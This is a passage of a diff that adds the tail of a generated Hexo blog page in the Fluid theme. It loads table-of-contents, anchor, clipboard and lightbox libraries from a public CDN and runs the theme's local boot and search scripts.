+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
